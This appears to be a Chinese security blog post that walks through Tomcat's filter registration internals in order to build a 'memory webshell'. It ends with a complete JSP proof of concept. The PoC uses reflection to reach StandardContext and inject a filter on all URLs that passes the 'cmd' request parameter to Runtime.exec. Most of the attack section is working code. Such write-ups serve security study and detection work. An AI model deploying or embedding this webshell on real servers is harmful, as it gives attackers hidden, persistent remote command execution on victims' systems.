### Filter

在Tomcat架构中Filter在配置文件和注解中，在其他代码中如果想要完成注册，主要有以下几种方式

使用 ServletContext 的 addFilter/createFilter 方法注册；

使用 ServletContextListener 的 contextInitialized 方法在服务器启动时注册；

使用 ServletContainerInitializer 的 onStartup 方法在初始化时注册（非动态）

+ ServletContext 的 addFilter/createFilter 注册

  **ServletContext#creatFilter**

  ```
  <T extends Filter> T createFilter(Class<T> var1) throws ServletException
  ```

  这个类还约定了一个事情，那就是如果这个 ServletContext 传递给 ServletContextListener 的 ServletContextListener.contextInitialized 方法，该方法既未在 web.xml 或 web-fragment.xml 中声明，也未使用 javax.servlet.annotation.WebListener 进行注释，则会抛出 UnsupportedOperationException 异常

  **ApplicationContext#addFilter()**

  ![屏幕截图 2024-06-28 141113](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-28%20141113.png)

  该方法创建了一个FilterDef对象，将fiterName,filterClass,filter对象初始化进去，使用 StandardContext 的 `addFilterDef` 方法将创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中，然后 new 了一个 ApplicationFilterRegistration 对象并且返回

  ![image-20240628143033976](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628143033976.png)

  需要注意的是，这个方法并没有将这个Filter放入到FilterChain中，单纯调用这个方法不会完成自定义 Filter 的注册。并且这个方法判断了一个状态标记，如果程序以及处于运行状态中，则不能添加 Filter。

  **Tomcat如何处理一次filterchain请求**

  我们可以先实现一个恶意的filter进行调试

  ![image-20240628144641398](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628144641398.png)

  **ApplicationFilterChian#internalDoFilter()**

  ![image-20240628150352284](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628150352284.png)

  调用filter.Filter(),filter来自

  ```java
  Filter filter = filterConfig.getFilter();
  ---
      ApplicationFilterConfig filterConfig = this.filters[this.pos++];
  ```

  filterConfig来自于一个filters数组，跟进到该数组赋值的位置

  **StandardWrapperValue#invoke**

  ![image-20240628152359316](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628152359316.png)

  调用了ApplicationFilterFactory#creatFilterChain方法

  ![image-20240628153200124](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628153200124.png)

  这个函数流程如下

  + 在context中获取 filterMaps，并遍历匹配 url 地址和请求是否匹配
  + 在context 中根据 filterMaps 中的 filterName 查找对应的 filterConfig
  + 获取到 filterConfig，则将其加入到 filterChain 中
  + 继续循环，直至添加所有匹配的filter

  根据上述流程，我们知道要动态注册一个filter我们需要在 StandardContext 中 filterMaps 中添加 FilterMap，在 filterConfigs 中添加 ApplicationFilterConfig

  在ApplicationFilter#addfilter()中，将初始化的filter放入StandardContext的filterDefs中，来看下另外两个参数是如何生成并添加的

  **StandardContext#filterStart()**

  ![屏幕截图 2024-06-28 213052](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-06-28%20213052.png)

  **ApplicationFilterRegistration#addMappingForUrlPatterns()**

  ![image-20240628213910446](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628213910446.png)

  如图添加了filtermap

  至此我们的思路是

  - 获取StandardContext对象
  - 创建恶意Filter
  - 使用FilterDef对Filter进行封装，并添加必要的属性
  - 创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中
  - 使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中

  首先获取当前环境中StandardContext的上下文，封装在ApplicationContext方法中

  通过jsp自带的request方法获取到ApplicationContextFaced类，再通过反射获取到封装的StandardContext

  ```jsp
  <%
      //获取ApplicationContextFaced类
      ServletContext servletContext = request.getSession().getServletContext();
      //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象
      Field appContext = servletContext.getClass().getDeclaredField("context");
      appContext.setAccessible(true);
      ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
      //获取StandardContext
      Field stdContext = applicationContext.getClass().getDeclaredField("context");
      stdContext.setAccessible(true);
      StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
  %>
  ```

  创建一个恶意filter

  ```jsp
  <%!
      public class TestFilter implements Filter {
  
          @Override
          public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
              String cmd = servletRequest.getParameter("cmd");
              if(cmd != null ){
                  try {
                      Runtime.getRuntime().exec(cmd);
                  } catch (IOException e) {
                      e.printStackTrace();
                  } catch (NullPointerException n) {
                      n.printStackTrace();
                  }
              }
              filterChain.doFilter(servletRequest, servletResponse);
          }
      }
  %>
  ```

  封装filterDef

  ```jsp
  <%
      shellFilter shellFilter = new shellFilter();
      String name = "shellfilter";
      FilterDef filterDef = new FilterDef();
      filterDef.setFilter(shellFilter);
      filterDef.setFilterName(name);
      filterDef.setFilterClass(String.valueOf(shellFilter.getClass()));
      standardContext.addFilterDef(filterDef);
  %>
  ```

  创建filtermap

  ```java
      FilterMap filterMap  = new FilterMap();
      filterMap.setFilterName(name);
      filterMap.addURLPattern("/*");
      filterMap.setDispatcher(DispatcherType.REQUEST.name());
      standardContext.addFilterMap(filterMap);
  ```

  获取filterConfigs并将filterDef添加

  ```java
      //使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中
      Field fieldconfigs = standardContext.getClass().getDeclaredField("filterConfigs");
      fieldconfigs.setAccessible(true);
      Map filterConfigs = (Map) fieldconfigs.get(standardContext);
          //获取构造函数
      Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
      constructor.setAccessible(true);
      ApplicationFilterConfig filterconfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
  
      filterConfigs.put(name,filterconfig);
  ```

  完整poc

  ```jsp
  <%--
    Created by IntelliJ IDEA.
    User: uu2fu3o
    Date: 2024/6/28
    Time: 22:08
    To change this template use File | Settings | File Templates.
  --%>
  <%@ page contentType="text/html;charset=UTF-8" language="java" %>
  <%@ page import="org.apache.catalina.core.ApplicationContext" %>
  <%@ page import="java.lang.reflect.Field" %>
  <%@ page import="org.apache.catalina.core.StandardContext" %>
  <%@ page import="java.io.IOException" %>
  <%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
  <%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
  <%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
  <%@ page import="java.util.Map" %>
  <%@ page import="java.lang.reflect.Constructor" %>
  <%@ page import="org.apache.catalina.Context" %>
  
  <%
      //获取ApplicationContextFaced类
      ServletContext servletContext = request.getSession().getServletContext();
      //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象
      Field appContext = servletContext.getClass().getDeclaredField("context");
      appContext.setAccessible(true);
      ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);
      //获取StandardContext
      Field stdContext = applicationContext.getClass().getDeclaredField("context");
      stdContext.setAccessible(true);
      StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);
  %>
  <%!
      public class shellFilter implements Filter {
  
          @Override
          public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
              String cmd = servletRequest.getParameter("cmd");
              if(cmd != null ){
                  try {
                      Runtime.getRuntime().exec(cmd);
                  } catch (IOException e) {
                      e.printStackTrace();
                  } catch (NullPointerException n) {
                      n.printStackTrace();
                  }
              }
              filterChain.doFilter(servletRequest, servletResponse);
          }
      }
  %>
  <%
      shellFilter shellFilter = new shellFilter();
      String name = "shellfilter";
      FilterDef filterDef = new FilterDef();
      filterDef.setFilter(shellFilter);
      filterDef.setFilterName(name);
      filterDef.setFilterClass(String.valueOf(shellFilter.getClass()));
      standardContext.addFilterDef(filterDef);
      //创建filtermap
      FilterMap filterMap  = new FilterMap();
      filterMap.setFilterName(name);
      filterMap.addURLPattern("/*");
      filterMap.setDispatcher(DispatcherType.REQUEST.name());
      //直接添加在最前
      standardContext.addFilterMapBefore(filterMap);
      //使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中
      Field fieldconfigs = standardContext.getClass().getDeclaredField("filterConfigs");
      fieldconfigs.setAccessible(true);
      Map filterConfigs = (Map) fieldconfigs.get(standardContext);
          //获取构造函数
      Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
      constructor.setAccessible(true);
      ApplicationFilterConfig filterconfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
  
      filterConfigs.put(name,filterconfig);
  
  %>
  ```

  ![image-20240628233938672](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240628233938672.png)

  效果如图